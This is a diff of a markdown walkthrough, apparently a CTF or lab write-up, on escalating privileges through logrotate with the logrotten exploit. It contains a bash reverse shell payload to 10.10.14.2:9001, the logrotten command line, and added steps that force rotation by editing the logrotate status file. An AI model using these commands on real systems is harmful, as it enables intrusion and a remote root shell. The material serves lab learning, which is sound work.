@@ -473,6 +473,7 @@ payload
 $ echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
 ```
 before running the exploit, we need to determine which option logrotate uses in logrotate.conf.
+
 ```shell
 $ grep "create\|compress" /etc/logrotate.conf | grep -v "#"
 ```
@@ -485,5 +486,12 @@ $ grep "create\|compress" /etc/logrotate.conf | grep -v "#"
 ./logrotten -p ./payloadfile -c -s 4 /tmp/log/pwnme.log
 
 ```
+we need to trigger the log file to rotate
+```shell
+logrotate -f /tmp/pwnme.log
 
+# edit /var/lib/logrotate.status to a date in the future. This tricks logrotate into thinking that the rotation hasn't occurred yet today
+
+# edit the log file  to add anything in it
+```
 
